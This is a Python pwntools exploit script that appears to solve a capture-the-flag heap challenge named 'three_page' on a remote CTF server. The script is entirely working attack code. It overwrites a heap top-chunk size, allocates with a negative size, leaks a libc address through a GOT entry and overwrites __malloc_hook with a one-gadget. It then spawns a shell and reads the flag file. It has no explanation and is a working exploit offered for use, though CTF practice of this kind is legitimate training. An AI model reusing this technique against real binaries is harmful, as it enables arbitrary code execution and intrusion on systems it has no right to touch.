#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10206
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./three_page') , ELF('./libc.so.6')

def add( size , data ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho( idx ):
    y.sendafter( 'ice:' , '3' )
    y.sendafter( 'x:' , str( idx ) )

def edt( idx , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( 'x:' , str( idx ) )
    y.sendafter( ':' , data )

def name( data ):
    y.sendafter( 'ice:' , '4' )
    y.sendafter( '?' , data )


add( 100 , 'a' )

name( 'D' * 0x18 + p64( 0xffffffffffffffff ) )

y.sendafter( 'ice:' , '1' )
y.sendafter( ':' , '-176' )
y.sendafter( ':' , 'a' )

add( 0x10 , 'a' )

edt( 0 , 'D' * 0x18 + p64( 0x601fd0 ) )

sho( 2 )

y.recvuntil( ': ' )
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )

edt( 0 , 'D' * 0x18 + p64( l.symbols['__malloc_hook'] ) )

one = 0xf1117

edt( 2 , p64( l.address + one ) )

y.sendafter( 'ice:' , '5' )
y.sendafter( ':' , '7' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()